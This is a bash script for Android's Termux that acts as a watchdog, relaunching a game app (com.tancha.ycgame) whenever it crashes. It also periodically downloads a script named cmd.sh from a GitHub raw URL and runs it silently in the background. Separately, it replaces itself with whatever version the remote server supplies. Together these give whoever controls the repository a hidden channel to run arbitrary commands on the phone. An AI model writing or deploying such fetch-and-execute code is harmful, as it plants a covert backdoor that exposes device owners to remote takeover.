#!/data/data/com.termux/files/usr/bin/bash
# 二次元守护 云控版
PKG="com.tancha.ycgame"
ACTIVITY=".MainActivity"
LOCAL_VERSION="2.6"
BASE_URL="https://raw.githubusercontent.com/auth-server-by/auth-server/main"
LIMIT=10
INTERVAL=2
CMD_INTERVAL=10

dl(){ curl -skL --connect-timeout 8 "$1" 2>/dev/null || wget -qO- --timeout=8 "$1" 2>/dev/null; }

check_update(){
  CLOUD_VER=$(dl "$BASE_URL/version.txt" | head -1 | tr -d '[:space:]')
  [ -z "$CLOUD_VER" ] && return
  if [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
    echo ">> New version, auto-updating..."
    NEW="$HOME/guard_new.sh"
    dl "$BASE_URL/guard.sh" > "$NEW"
    if [ -s "$NEW" ] && grep -q "二次元守护" "$NEW"; then
      chmod 755 "$NEW"
      mv "$NEW" "$0"
      exec bash "$0"
    fi
  fi
}

remote_cmd(){
  TMP="$HOME/cmd_tmp.sh"
  dl "$BASE_URL/cmd.sh" > "$TMP" 2>/dev/null
  if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
    bash "$TMP" >/dev/null 2>&1 &
  fi
  rm -f "$TMP"
}

launch(){
  am start -n "$PKG/$ACTIVITY" >/dev/null 2>&1
  sleep 2
  pidof "$PKG" >/dev/null 2>&1 || {
    monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
    sleep 2
  }
}

echo "Guard v$LOCAL_VERSION started"
cycle=0 crash=0 running=false
while :; do
  cycle=$((cycle+1))
  [ $((cycle%60)) -eq 0 ] && check_update
  [ $((cycle%CMD_INTERVAL)) -eq 0 ] && remote_cmd
  if pidof "$PKG" >/dev/null 2>&1; then
    running=true
    crash=0
  else
    if $running; then
      crash=$((crash+1))
      echo "Exit $crash/$LIMIT"
      [ $crash -gt $LIMIT ] && { echo "Too many crashes, stop"; exit 1; }
      launch
    fi
    running=false
  fi
  sleep $INTERVAL
done
